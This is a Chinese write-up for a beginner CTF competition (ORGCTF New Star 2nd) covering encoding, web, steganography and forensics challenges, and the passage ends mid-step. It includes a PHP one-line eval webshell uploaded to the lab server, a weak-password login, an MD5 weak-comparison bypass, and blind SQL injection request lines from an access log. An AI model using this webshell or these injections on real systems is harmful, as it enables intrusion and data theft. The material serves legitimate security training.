# 第二届贡橙杯CTF竞赛题解（Write-up）

## 目录

[TOC]
## 一、签到部分
### [签到]Welcome to ORGCTF New Star 2nd!
思路分析：看图得flag
解题步骤：
```
下载题目附件，打开附件图片，flag如图所示
```
![](http://image.penguinway.space/i/2023/11/03/654515ebb3724.png)
### [签到]easy_encode1
思路分析：此题题干所给编码明显为base64编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/03/654517a1d09e3.png)
### [签到]easy_encode2
思路分析：此题题干所给编码明显为base58编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/03/6545188d20694.png)
### [签到]easy_encode3
思路分析：此题题干所给编码明显为base32编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/6545199f54ef5.png)
### [签到]easy_encode4
思路分析：此题题干所给编码明显为base16编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/654519dc7f78a.png)
### [签到]easy_encode5
思路分析：此题题干所给编码明显为base85编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/65451a4aa3305.png)
### [签到]easy_encode6
思路分析：此题题干所给编码明显为base100编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/65451a93c26c8.png)
### [签到]easy_encode7
思路分析：此题题干所给编码明显为unicode编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/65451ad717722.png)
### [签到]easy_encode8
- escape编码
```
escape采用ISO Latin字符集对指定的字符串进行编码。所有的空格符、标点符号、特殊字符以及其他非ASCII字符都将被转化成%xx格式的字符编码（xx等于该字符在字符集表里面的编码的16进制数字）
```
思路分析：此题题干所给编码明显为escape编码加密，使用解密工具解密即可
解题步骤：
```
打开解密工具，输入密文，解密即可
```
![](http://image.penguinway.space/i/2023/11/04/65451b8c64256.png)
### [签到]web_default
- 网站的默认页面
```
一般网站的默认页面为
index.php
index.html
```
- 网站的请求与响应
```
网站的请求与响应过程涉及客户端（浏览器）和服务器之间的通信。下面是一个简化的请求与响应过程的步骤：

1. 客户端发起请求：用户在浏览器中输入网址或点击链接，浏览器会向服务器发送HTTP请求。请求包括请求方法（如GET、POST）、请求头（包含用户代理、Cookie等信息）和请求体（对于POST请求，包含表单数据等）。

2. 服务器接收请求：服务器接收到客户端发送的请求后，开始处理请求。服务器会解析请求头和请求体，并根据请求的内容进行相应的处理。

3. 服务器处理请求：服务器根据请求的内容执行相应的操作，可能包括读取数据库、处理业务逻辑等。服务器还可以生成动态内容，如使用服务器端脚本生成网页。

4. 服务器生成响应：服务器根据请求的处理结果生成HTTP响应。响应包括响应状态码（如200表示成功、404表示未找到等）、响应头（包含内容类型、缓存控制等信息）和响应体（包含实际的内容，如HTML页面、图片等）。

5. 服务器发送响应：服务器将生成的HTTP响应发送回客户端。响应经过网络传输到客户端。

6. 客户端接收响应：浏览器接收到服务器发送的HTTP响应后，开始解析响应。浏览器会首先检查响应状态码，根据状态码判断请求是否成功。然后，浏览器解析响应头和响应体，并根据响应的内容进行相应的处理。

7. 客户端渲染页面：如果响应是一个HTML页面，浏览器会解析HTML、CSS和JavaScript，渲染页面并显示给用户。如果响应包含其他类型的内容，如图片或文件，浏览器会相应地处理这些内容。

以上是一个简化的请求与响应过程，实际过程可能会更加复杂，涉及到缓存、重定向、身份验证等其他因素。但总体上，请求与响应过程是客户端和服务器之间进行通信的基本流程。
```
思路分析：题干中提示使用网站的默认页面访问，进入题目容器后注意到提示，初步分析考点与网页的请求与响应相关，根据这两个提示解题
解题步骤：
```
访问容器地址+/index.php，打开开发者工具查看网络请求与响应体
```
![](http://image.penguinway.space/i/2023/11/04/65461e146a8a1.png)
```
在响应体中可见flag
```
![](http://image.penguinway.space/i/2023/11/04/65461f4203ccf.png)
### [签到]cat_flag
思路分析：由题干和题目标题可知，此题只需使用netcat工具连接靶机即可
解题步骤：
```
使用netcat工具，连接靶机，输入命令cat flag，可得flag
```
![](http://image.penguinway.space/i/2023/11/04/65461fb40db08.png)

## 二、Web部分
### [Web]传什么参数好呢？
- GET/POST传参和User-Agent
```
GET传参和POST传参是HTTP请求中常用的两种传递参数的方式。

1. GET传参：GET方法通过URL中的查询字符串（query string）传递参数。查询字符串是在URL中以`?`符号开始的部分，参数以键值对的形式出现，多个参数之间使用`&`符号分隔。例如，`https://example.com/search?q=keyword&page=1`中的`q=keyword`和`page=1`就是GET传参的示例。

   GET传参的特点是参数直接暴露在URL中，可以被用户看到和修改。由于URL长度有限制，GET传参适合传递少量的参数，且不适合传递敏感信息，如密码等。

2. POST传参：POST方法通过请求体（request body）传递参数。请求体是在HTTP请求中的一个部分，用于传递更大量或敏感的数据。参数以键值对的形式出现，多个参数之间使用`&`符号分隔，与GET传参的格式相同。

   POST传参的特点是参数不会直接暴露在URL中，而是放在请求体中，对用户不可见。POST传参适合传递大量的参数或包含敏感信息的数据。

User-Agent（用户代理）是HTTP请求头的一部分，用于标识发送请求的客户端（浏览器、爬虫等）。它包含了客户端的相关信息，如操作系统、浏览器版本等。服务器可以根据User-Agent来判断客户端的类型和能力，从而提供适合的响应。

User-Agent的示例：`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36`

通过解析User-Agent，服务器可以根据不同的客户端类型进行适配，提供不同的页面布局或功能。例如，移动设备访问时可以提供移动版页面，桌面设备访问时提供桌面版页面。
```
- MD5
```
MD5（Message Digest Algorithm 5）是一种常用的哈希函数算法，用于将任意长度的数据转换为固定长度的哈希值（通常是128位）。它是由Ronald Rivest于1991年设计的。
MD5算法的特点如下：

固定长度：MD5生成的哈希值的长度是固定的，无论输入数据的长度如何，输出的哈希值始终是128位。

唯一性：对于不同的输入数据，MD5算法生成的哈希值通常是唯一的，即使输入数据只有微小的差异，输出的哈希值也会有很大的不同。

不可逆性：MD5算法是单向的，即无法从哈希值还原出原始的输入数据。这意味着无法通过哈希值来获取原始数据的内容。

快速性：MD5算法的计算速度相对较快，适用于对大量数据进行哈希计算。
```
思路分析：启动容器，可以看到一个php文件，分析这个php文件，可以发现我们有三个值可以控制，分别是GET方法传入的参数name，POST方法传入的参数id，和User-Agent，我们通过传入题目要求的值后便可以得到flag
解题步骤：
```
1.首先通过GET方法要求，传入参数"name"，值为"orgctf"，即拼接URL为 "容器地址+/?name=orgctf"
```
![](http://image.penguinway.space/i/2023/11/04/65462352aa08c.png)
```
2.观察代码，发现POST时传入的参数需要被MD5编码，而且其前5位需为"5531a"，根据参数名称"id"猜测其为数字，则此时需要爆破出一个可用的参数传入，故编写python脚本进行爆破
```
```python
import hashlib
def calculate_md5(data):
    md5_hash = hashlib.md5()
    md5_hash.update(data.encode('utf-8'))  # 将字符串编码为字节流并更新哈希对象
    return md5_hash.hexdigest()  # 获取十六进制表示的哈希值
for i in range(1, 5000):
    md5_value = calculate_md5(str(i))
    print(re := str(i) + "的MD5哈希值:" + str(md5_value))
    with open("flag.txt", 'a+', encoding="UTF-8") as f:
        f.write(re + "\n")
```
```
3.运行结束后，打开flag.txt文件，查找"5531a"可知"2023"的MD5值满足要求
```
![](http://image.penguinway.space/i/2023/11/04/6546268c5aa44.png)
```
4.POST传参id = 2023，进入下一步
```
![](http://image.penguinway.space/i/2023/11/04/65462717187ea.png)
```
5.由提示可知，我们需要设置User-Agent为ORGCTF_newstar，设置好后完整发起请求可得flag
```
![](http://image.penguinway.space/i/2023/11/04/6546278bf2a92.png)
### [Web]好好好好好混乱！
- JsFuck混淆
```
JSFuck是一种奇特的编码技术，它可以将JavaScript代码表示为仅使用六个字符：`[]()!+`。这种编码方式的目的是通过利用JavaScript中的一些特性和运算符来实现完整的代码表示。
JSFuck的原理是利用了JavaScript中的隐式类型转换和一元操作符。通过组合这些字符，可以构建出各种JavaScript语句和表达式，从而实现完整的代码功能。
下面是一个简单的示例，展示了如何使用JSFuck编码表示一个简单的`alert('Hello, World!')`语句：
```
```javascript
([]+[])[+!+[]]+(![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]
```
```
这段代码看起来很奇怪，但实际上它是由一系列JSFuck编码字符组成的，并且能够被JavaScript解释器正确执行。
JSFuck编码的原理是将JavaScript语句和表达式拆解成由`[]()!+`这六个字符组成的字符串，并通过隐式类型转换和一元操作符重新组合，以实现相应的功能。这种编码方式的目的是为了绕过一些限制，例如代码过滤、审查或防止注入攻击等。
```
思路分析：打开容器页面后，我们使用开发者工具查看源代码，比较容易可以看到JsFuck混淆过的代码，解混淆即可
解题步骤：
```
因为JsFuck编码本质上是JS代码，所以我们可以直接在控制台执行，达到解混淆的目的
复制混淆代码，在控制台执行，可发现无输出，不需奇怪，其可能是一个赋值语句，我们猜测其变量名为flag，在控制台输入flag即可查看其值，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/654629421f7bf.png)
### [Web]Nazo_Game?
思路分析：此题只需一步步完成出题人设置的谜题，即可得到flag
解题步骤：
```
1.打开容器页面，题目提示我们需要进入下一页，且下一页信息在控制台内，但是右键，Ctrl+U，F12均被禁用，此时我们可以通过Ctrl+Shift+I快捷键或者直接在浏览器右上角设置内打开开发者工具，可知下一页为2nd.html
2.第二关提示我们查看源代码，思考如何显示flag，此时我们关注到一行注释，该注释内的代码根据观察可猜测其为显示flag的按钮，我们可以在开发者工具中解除其注释，按钮出现，我们单击他，flag第一部分显示，进入下一页33333333.html
```
![](http://image.penguinway.space/i/2023/11/04/65462b873f4cd.png)
```
3.第三关要求我们根据MD5串反推其原文，此时我们可以通过相应的工具网站得到原文"DaCapo"，进入相应URL"容器地址+/DaCapo.txt"，得到flag的第二部分，进入下一页four.html
```
![](http://image.penguinway.space/i/2023/11/04/65462bc907e81.png)
```
4.第四关要求我们根据给出的音乐得到歌名的某种编码，我们可以根据源代码得知要求的编码为base64，而歌名可通过听歌识曲得到，为TruE，flag所有部分拼接完成。
```
![](http://image.penguinway.space/i/2023/11/04/65462d0b9adfc.png)
### [Web]文件暂存
- 一句话木马
```
一句话木马（One-Liner Trojan）是一种恶意软件的变种，它以一行简短的代码形式存在，用于在受害者的系统上执行恶意操作。这种木马通常是通过利用脚本语言（如PHP、Python、JavaScript等）的灵活性和强大功能来实现的。

一句话木马的目标是将恶意代码嵌入到合法的代码中，使其在受害者系统上执行，从而实现攻击者的恶意目的。攻击者可以通过各种方式将一句话木马注入到目标系统中，例如通过漏洞利用、社会工程等手段。

一句话木马通常具有以下特点：

简短的代码：一句话木马通常以一行代码的形式存在，这使得它们很容易隐藏和传播。

功能强大：尽管代码很短，但一句话木马通常具有强大的功能，例如远程命令执行、文件上传、系统信息收集等。

隐蔽性：一句话木马通常会使用各种技术来隐藏自身，例如使用特殊字符、加密、编码等。

跨平台：一句话木马可以用于多种脚本语言，因此可以在不同的操作系统和环境中使用。
```
思路分析：此题给出的情景为文件上传，我们可以尝试上传几个不同类型的文件，发现其对php文件开放上传，查阅相关资料可以知道，我们能够通过植入一句话木马打开网站后台，从而找到网站目录中的flag
解题步骤：
```php
1.编写一句话木马
<?php @eval($_POST['shell']);?>
```
```
2.上传到网站目录中
```
![](http://image.penguinway.space/i/2023/11/04/65462ec8a8316.png)
```
3.通过AntSword工具激活目录中的一句话木马，打开网站后台
```
![](http://image.penguinway.space/i/2023/11/04/65462f0be5ce6.png)
```
4.通过终端进入网站目录，发现flag.out文件，执行得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65462f5f9dce2.png)
### [Web]相同孰不相同？
- MD5绕过
相关链接：[MD5绕过技巧](https://pankas.top/2022/03/11/%E5%85%B3%E4%BA%8Emd5%E7%9A%84%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/)
```
MD5是一种常见的哈希算法，用于将任意长度的数据转换为固定长度的哈希值。然而，由于MD5算法的特性，它存在一些安全性问题，使得可能存在MD5绕过的情况。

MD5绕过是指通过一些技术手段，以不同的方式生成相同的MD5哈希值，从而绕过原本的安全机制。主要的MD5绕过技术包括以下几种：

彩虹表攻击：彩虹表是一种预先计算好的哈希值与对应的明文之间的映射表。攻击者可以使用彩虹表来查找与目标MD5哈希值相匹配的明文，从而绕过MD5的安全性。这种攻击方式需要大量的计算和存储资源。

哈希碰撞：哈希碰撞是指找到两个不同的输入，但它们的MD5哈希值相同。攻击者可以通过特殊的算法和计算资源来生成具有相同MD5哈希值的不同输入，从而绕过MD5的安全性。

预计算攻击：攻击者可以事先计算大量常见密码、字典中的单词或常见字符串的MD5哈希值，并将其存储在数据库中。然后，当需要绕过MD5时，攻击者可以直接在数据库中查找相应的哈希值，以获取对应的明文。
```
思路分析：观察php代码可知，本题需要我们传入两个参数a b，同时对这两个参数做MD5编码，当编码相等时，即显示flag，我们可以通过正向思维进行MD5碰撞，也可以通过逆向思维，尝试绕过MD5验证，这里我们使用绕过法
解题步骤：
```
观察代码可以知道，我们可以通过php弱类型比较漏洞来绕过MD5验证，绕过方法如下图
```
![](http://image.penguinway.space/i/2023/11/04/654631639f630.png)
```
尝试上面的传入参数得到flag
```
![](http://image.penguinway.space/i/2023/11/04/654631da7f9e3.png)
### [Web]登录？登录！
思路分析：此题没有给过多提示，猜测其为弱口令爆破攻击，根据常用弱口令攻击得到flag
解题步骤：
```
常见的管理用户名为admin
常见的弱口令为123456,password,qwerty,114514等
我们逐一尝试，得到用户名为admin，密码为password，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/654632b8100b6.png)
## 三、Misc部分
### [Misc]她真好看
思路分析：附件为视频文件，猜测其为关键帧隐藏flag，故观看视频可知flag
解题步骤：
![](http://image.penguinway.space/i/2023/11/04/6546443907e9c.png)
![](http://image.penguinway.space/i/2023/11/04/654645c979843.png)
### [Misc]看看你的里面
思路分析：附件为单一图片文件，猜测其为文件叠加隐写，故分离文件可得到含有flag的文件
解题步骤：
```
1.使用foremost分离文件，分离得一加密压缩包，故得到flag的关键在于得到压缩包密码
```
![](http://image.penguinway.space/i/2023/11/04/6546471613c5b.png)
```
2.采用多种方式尝试破解压缩包，如爆破，尝试伪加密等，但无济于事
3.根据题目提示，"看附件面面俱到"，猜测压缩包密码在原始附件中，打开原始附件的详细信息显示，发现压缩包密码
```
![](http://image.penguinway.space/i/2023/11/04/654647c664d86.png)
```
4.解压压缩包，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/654648061024f.png)
### [Misc]Moon Halo
思路分析：附件为一音乐文件，播放正常，猜测其flag隐藏在频谱图中，使用软件打开音乐文件可得flag
解题步骤：
```
使用频谱图软件打开文件，查看到flag
```
![](http://image.penguinway.space/i/2023/11/04/6546490d697ce.png)
### [Misc]耳机坏了？
思路分析：附件为一音乐文件，但右声道明显为摩斯电码，故使用解码网站得到flag
解题步骤：
```
首先使用软件分离左右声道
使用解码网站https://morsecode.world/international/decoder/audio-decoder-adaptive.html ，翻译右声道的摩斯电码
```
![](http://image.penguinway.space/i/2023/11/04/65464b88b0f67.png)
```
根据提示，将二进制码翻译为字符串得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65464c0f6a10c.png)
### [Misc]Only QRcode？
- [ZIP文件结构解析](https://goodapple.top/archives/700)
思路分析：附件为一张二维码，扫码得到一个网址，提示需要密码，所以我们需要找到密码，猜测密码文件叠加在原始文件内，所以分离文件得到密码，进而得到flag
解题步骤：
```
扫描附件二维码，得到网址:https://www.penguinway.space/index.php/2023/10/14/flag-is-here-but-where-is-password/ 
提示我们需要密码查看flag，尝试使用foremost分离原始附件，失败，使用winhex打开原始附件，发现确实有压缩包隐藏，提取出压缩包
```
![](http://image.penguinway.space/i/2023/11/04/65464ef61589b.png)
```
提取到新文件中，命名为flag.zip
```
![](http://image.penguinway.space/i/2023/11/04/65464f663981a.png)
```
打开压缩包得到密码
```
![](http://image.penguinway.space/i/2023/11/04/65464fc280983.png)
```
输入密码得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65465022964d6.png)
### [Misc]WC,()!
思路分析：附件为一张带有条码的图片，判别其为DataMatrix码，扫码，经过系列操作得到flag
解题步骤：
```
扫码，得到含有flag的加密密文
```
![](http://image.penguinway.space/i/2023/11/04/6546518b3b970.png)
```
判断密文为新与佛论禅加密，通过解密工具解密得提示
```
![](http://image.penguinway.space/i/2023/11/04/654651cf87923.png)
```
根据密文形式，判断为移位密码，由于b与o相距13，判断为rot13加密，解密得flag
```
![](http://image.penguinway.space/i/2023/11/04/6546523a1192e.png)
### [Misc]坚不可破？
思路分析：附件为一加密压缩包，根据压缩包内文本文件大小仅为6bytes这一现象，判断可以使用CRC爆破文件内容，使用工具爆破CRC值得到flag
解题步骤：
```
使用CRC爆破工具得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65465384a3799.png)
### [Misc]QQ的三月七
- JPG文件头
参考资料：https://blog.csdn.net/specter11235/article/details/70305713
思路分析：附件为一张图片，根据图片信息判断，其大小有修改痕迹，可通过修改文件16进制值放大文件得到flag
解题步骤：
```
使用Winhex打开附件图片，查找文件头
```
![](http://image.penguinway.space/i/2023/11/04/654655919ec6b.png)
```
将它调大，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/6546569b73da0.png)
![](http://image.penguinway.space/i/2023/11/04/654655d8ce3e6.png)
### [Misc]easy_stego
- LSB隐写
```
LSB隐写（Least Significant Bit Steganography）是一种常见的隐写术，用于在数字图像、音频或视频等媒体文件中隐藏秘密信息。LSB隐写的基本原理是将秘密信息嵌入到媒体文件的最低有效位（Least Significant Bit）中，因为修改最低有效位通常对图像或音频质量的影响较小，难以察觉。

LSB隐写的步骤如下：

1. 选择载体文件：选择一个媒体文件作为载体，通常是图像文件（如BMP、PNG）或音频文件（如WAV、MP3）。

2. 将秘密信息转换为二进制：将要隐藏的秘密信息转换为二进制形式。例如，如果要隐藏文本信息，可以将每个字符的ASCII码转换为8位的二进制编码。

3. 嵌入秘密信息：将二进制的秘密信息逐位地嵌入到载体文件的最低有效位中。对于图像文件，通常是在每个像素的RGB（红绿蓝）值中修改最低位；对于音频文件，通常是在采样数据中修改最低位。

4. 保存修改后的载体文件：将修改后的载体文件保存到磁盘上。

5. 提取秘密信息：如果需要提取隐藏的秘密信息，可以通过读取载体文件的最低有效位来还原嵌入的二进制数据，然后将二进制数据转换回原始的秘密信息形式。

LSB隐写方法的优点是简单易用，但也有一些限制和风险。首先，嵌入的秘密信息容量有限，取决于载体文件的大小和嵌入位数。其次，如果嵌入的修改过于明显，可能会引起怀疑并被探测到。此外，一些图像或音频处理操作（如压缩、裁剪、重新编码）可能会破坏嵌入的秘密信息。

因此，在实际应用中，LSB隐写常常需要结合其他的隐写技术和安全措施，以增强隐藏性和抵抗隐写分析的能力。
```
思路分析：附件为一张图片，结合题目，分析其为LSB隐写，使用工具可得flag
解题步骤：
```
使用工具打开文件，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/654657eb84179.png)
### [Misc]0k?
- 文件修改时间隐写
```
文件修改时间隐写（File Modification Time Steganography）是一种隐写术，利用文件的修改时间信息来隐藏秘密信息。这种隐写方法利用了文件的元数据中的时间戳，通常是最后修改时间（Last Modified Time），来嵌入秘密信息，以达到隐藏和传输信息的目的。

文件修改时间隐写的基本原理如下：

1. 选择载体文件：选择一个文件作为载体，通常是具有修改时间元数据的文件，如文本文件、图像文件、音频文件等。

2. 将秘密信息转换为二进制：将要隐藏的秘密信息转换为二进制形式。例如，将文本信息转换为二进制编码。

3. 修改文件的修改时间：根据秘密信息的二进制值，逐位地修改文件的修改时间。例如，可以通过增加或减少时间的毫秒部分来表示二进制的0或1。

4. 保存修改后的文件：将修改后的文件保存到磁盘上。

5. 提取秘密信息：如果需要提取隐藏的秘密信息，可以通过读取文件的修改时间，并解析其中的二进制数据，将其转换回原始的秘密信息形式。

```
- UNIX时间戳
```
Unix时间戳是指从协调世界时（UTC）1970年1月1日 00:00:00起经过的秒数。它是一种用于表示时间的标准方式，在Unix系统和许多其他计算机系统中广泛使用。

Unix时间戳是一个整数，表示自1970年1月1日 00:00:00以来经过的秒数。它不考虑时区和夏令时的影响，始终以UTC时间为基准。当需要在不同的时区之间进行时间转换时，可以使用时间偏移量来调整Unix时间戳。

Unix时间戳具有以下特点：

1. 精确到秒：Unix时间戳以秒为单位计算时间，忽略了毫秒和微秒等更小的时间单位。

2. 正负值：Unix时间戳可以是正值或负值。正值表示1970年1月1日之后的时间，而负值表示1970年1月1日之前的时间。

3. 跨平台兼容：Unix时间戳是一种通用的时间表示方式，可以在不同的操作系统和编程语言中使用。

Unix时间戳在计算机系统中有广泛的应用，包括文件时间戳、时间函数、日志记录、时间比较等。它还可以用于计算时间间隔、定时任务和时间戳转换等操作。
```
思路分析：打开附件压缩包，发现内部全为空文件，同时观察到文件修改时间参差不齐，根据提示："风带来**flag**的种子，**时间**使之发芽"，猜测为文件修改时间隐写，编写python脚本解密得到flag
解题步骤：
```
打开压缩包，提取出所有文件，在附件目录下编写python脚本提取出修改时间，初始时间根据文件修改时间的分布，猜测为2023/11/04 08:00:00，unix时间戳为1699056000
```
```python
import os
flag = ""
t0 = 1699056000
for i in range(0, 26):
    char = chr(int(os.path.getmtime(str(i) + ".txt") - t0))
    print(str(i) + ".txt对应字母:" + char)
    flag += str(char)
print(flag)
```
```
运行得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65465aef665fa.png)
### [Misc]隐藏的Password
思路分析：附件为pcap流量包，我们可以根据流量包中的流量信息分析出password，进而得到flag
解题步骤：
```
打开流量包，追踪HTTP流的信息，得到flag
```
![](http://image.penguinway.space/i/2023/11/04/65465c1bc4bac.png)
### [Misc]路飞真帅！
参考文档：[[Misc]哇！海贼王！(黑龙江省赛)](https://www.penguinway.space/index.php/2023/09/16/misc%e5%93%87%ef%bc%81%e6%b5%b7%e8%b4%bc%e7%8e%8b%ef%bc%81%e9%bb%91%e9%be%99%e6%b1%9f%e7%9c%81%e8%b5%9b/)
思路分析：附件为一图片，考虑用Winhex打开，在文件尾发现一base64串，同时考虑分离文件，得到两个压缩包，其中一压缩包中含flag图片,另一压缩包可用CRC爆破，进而结合得到flag
解题步骤：
```
参考上述文档，最终得到flag图片
```
![](http://image.penguinway.space/i/2023/11/04/65465f62755a1.png)
## 四、Forensics部分
### [Forensics]神秘代码
思路分析：根据题干，压缩包密码为4位数字，可以直接使用工具爆破密码得到flag
解题步骤：

```
使用工具爆破压缩包密码,得到flag加密密文，观察为brainfuck加密，解密得flag
```
![](http://image.penguinway.space/i/2023/11/04/654661b9212dc.png)
![](http://image.penguinway.space/i/2023/11/04/654661ca3f85e.png)
![](http://image.penguinway.space/i/2023/11/04/6546622c0596c.png)
### [Forensics]锲而不舍
思路分析：根据题目暗示，猜测此题为多重加密，逐次解密得flag
解题步骤：
![](http://image.penguinway.space/i/2023/11/04/654662ccd0ad1.png)
![](http://image.penguinway.space/i/2023/11/04/654662e0bf64c.png)
![](http://image.penguinway.space/i/2023/11/04/65466304daa2a.png)
![](http://image.penguinway.space/i/2023/11/04/654663108fc27.png)
### [Forensics]同好招募！
思路分析：根据题干，进入文章，解密base64即得flag，希望大家好好看完了文章~
解题步骤：

```
(中文版本:UTF-8)
我们是一群对信息安全有浓厚兴趣的同学，彼此之间互相学习。所谓“校队”事实上是一个松散集体，我们的初衷为聚合在一起参加赛事，博采众长，并在有可能代表学校出战CISCN等竞赛。
我们的战绩有

* 2021年HITCTF 11名
* 2022年CISCN 东北赛区二等奖
* 2023年黑龙江省网络安全技能竞赛三等奖

您可以通过以下几种方法加入校队：

1. 参加赛事并取得好成绩。事实上，本站赛事一般都比较简单，您只需要稍微努力进入前列，我们就将主动与您联系
2. 主动联系站长，投递简历。简历需要说明您的主要兴趣方向和您的一些小成就，例如您的Github项目、大作业、写的小程序，亦或是您的CVE、破解产品的概述、分析报告、密码学相关的博客等
 投递简历方法不受时间限制，您可以在任何时间向置顶文章中的站长邮箱中投递简历。主题中需要说明“校队简历投递”。
 以下是一些小技巧
 * 简历不需要很正式，投递txt也行。我们注重于您的内容
 * 您需要在简历中至少给出一种联系方式，我们建议是QQ号或者常用邮箱，以便我们联系您。
 * 根据您的简历情况，我们可能会安排面试。如有此需要，我们会提前通知您
 * 以下是一些加分项
 ** 您的个人博客
 ** 代码内容
 ** CTF竞赛名次（不限任何比赛）

---------------

以上

顺颂时祺

hed10ne
及 
HEU_CTF校队全体成员

orgctf{We_sincerely_invite_you_to_join_the_HEU_CTF_family}
---------------
(English Version)
We are a group of students with a strong interest in information security, learning from each other. The so-called "school team" is, in fact, a loose collective. Our original intention is to come together to participate in competitions, learn from one another, and possibly represent the school in competitions such as CISCN.

Our achievements include:

11th place in HITCTF 2021
Second prize in the Northeast Region of CISCN 2022
Third prize in the Heilongjiang Province Cybersecurity Skills Competition

You can join the school team through the following methods:

Participate in competitions and achieve good results. In fact, the competitions on this platform are generally relatively simple, so if you make some effort to get to the top, we will proactively contact you.
Contact the site administrator proactively and submit your resume. Your resume should mention your main areas of interest and some of your minor achievements, such as your GitHub projects, major assignments, small programs you've written, or an overview of your CVEs, product cracking, analysis reports, or cryptography-related blogs, and more.
There is no time limit for submitting resumes, and you can submit your resume to the site administrator's email address listed in the pinned article at any time. The subject should include "School Team Resume Submission."

Here are some tips:

* Your resume doesn't need to be very formal; submitting a plain text file is fine. We focus on your content.
* You need to provide at least one contact method in your resume. We recommend using a QQ number or a commonly used email address so we can reach out to you.
* Depending on your resume, we may arrange an interview. If necessary, we will notify you in advance.
Here are some bonus points:
* Your personal blog
* Code contributions
* CTF competition rankings (any competition)

Thats all

Best regards,

hed10ne
And 
all members of HEU_CTF school team

orgctf{We_sincerely_invite_you_to_join_the_HEU_CTF_family}
```
### [Recon]Find_me
思路分析：使用搜索引擎以图搜图即可得此地为**中华人民共和国江西省赣州市崇义县阳岭国家森林公园**，英文为Chongyi-County-Ganzhou-City-Jiangxi-Province-PRC，可得flag
解题步骤：
```
使用以图搜图
```
![](http://image.penguinway.space/i/2023/11/04/65466543869d9.png)
### [Forensics]找的到吗？
思路分析：附件为word文档，猜测是小字体隐藏，仔细阅览，在页尾处可发现flag
解题步骤：
```
仔细阅览，不要做星际玩家~
```
![](http://image.penguinway.space/i/2023/11/04/654667b709ef9.png)
### [Forensics]logloglog!
思路分析：附件为一日志文件，日志往下拉可以看到flag相关的SQL注入，分析后发现大致意思就是 读取flag内容，取第一个字符然后转化成ascii码，判断是否大于某个数，因此我们可以通过复现他的过程得到flag
解题步骤：
```
日志往下拉可以看到flag相关的SQL注入
172.29.0.1 - - [15/Jun/2023:13:33:50 +0000] "GET /?
id=1%20and%20ascii(substr((select%20group_concat(flag)%20from%20flag),1,1))%3E42
HTTP/1.1" 200 699 "-" "python-requests/2.31.0"
大概意思就是
IP为 172.29.0.1 的客户端，在时间 [15/Jun/2023:13:33:50 +0000] ，使用 GET 请求，访问了URL /?id=1%20and%20ascii(substr((select%20group_concat(flag)%20from%20flag),1,1))%3E78 。
其中HTTP版本是 HTTP/1.1 ，请求结果是 200 成功，返回内容长度是 699 字节。
客户端信息是 python-requests/2.31.0 （一个python的网络库）
看下URL内容 URL Decode之后长这样： /?id=1 and ascii(substr((select group_concat(flag) from flag),1,1))>78
```
![](http://image.penguinway.space/i/2023/11/05/6546e156239fb.png)
```
大致意思就是 读取flag内容 取第一个字符然后转化成ascii码 判断是否大于42
因此我们要整理日志提取 字符位置 比较的数字 和 返回长度，我们可以编写python脚本实现这一点
```
```python
import re

line = []
with open("test.txt", "r", encoding="UTF-8") as f:
    lines = f.readlines()
    for url in lines:
        # 提取substr第二个参数
        substr_match = re.search(r'substr\([^,]+,(\d+)', url)
        if substr_match:
            substr_value = substr_match.group(1)
            print("substr parameter:", substr_value)

        # 提取%3E后面的数字
        greater_than_match = re.search(r'%3E(\d+)', url)
        if greater_than_match:
            greater_than_value = greater_than_match.group(1)
            print("%3E value:", greater_than_value)

        result_match = re.search(r'200 (\d+)', url)
        if result_match:
            result_value = result_match.group(1)
            print("result:", result_value)
        re1 = str(substr_value) + " " + str(greater_than_value) + " " + str(result_value)
        line.append(re1)
with open("result.txt", "w", encoding="UTF-8") as f:
    for result in line:
        f.write(result + "\n")
```
![](http://image.penguinway.space/i/2023/11/05/6546e8690cb44.png)
```
运行结果如上
那么问题来了 这个该怎么分析呢
第一个字符假设称之为x
x>78结果是704
x>54结果是704
x>42结果是699
那么704和699哪个代表成功呢 当然是699代表成功 704代表失败
那么具体x的值怎么判断呢 继续看日志
x>53结果是假
x>52结果是真
那么x是多少 当然是53
因此我们只要收集最后一次判断为假的结果即可
把数据存起来即可
现在把处理好的日志保存起来 假设叫result.txt
接下来写段python脚本：
```
```python
with open("result.txt", "r") as f:
    data = f.read()
nums = [i for i in data.split('\n')]  # 把读取到的字符串按行切割成数组
nums = [[int(j) for j in i.split(' ')] for i in nums if len(i) >= 3]  # 把每行按空格进一步切割并转化成数字
print(nums[:5])  # 打印前5组数据
flag = [0] * 517  # 初始化数组
for num in nums:
    if num[2] == 704:
        flag[num[0] - 1] = num[1]
        print(flag[:5])  # 打印前5个flag
with open("out.txt", "wb") as f:
    f.write(bytes(flag))
```
![](http://image.penguinway.space/i/2023/11/05/6546ee9371404.png)
```
运行结果如上图
优先怀疑这个东西是hex编码 把它拖进CyberChef中选择From Hex可以看到如下内容：
```
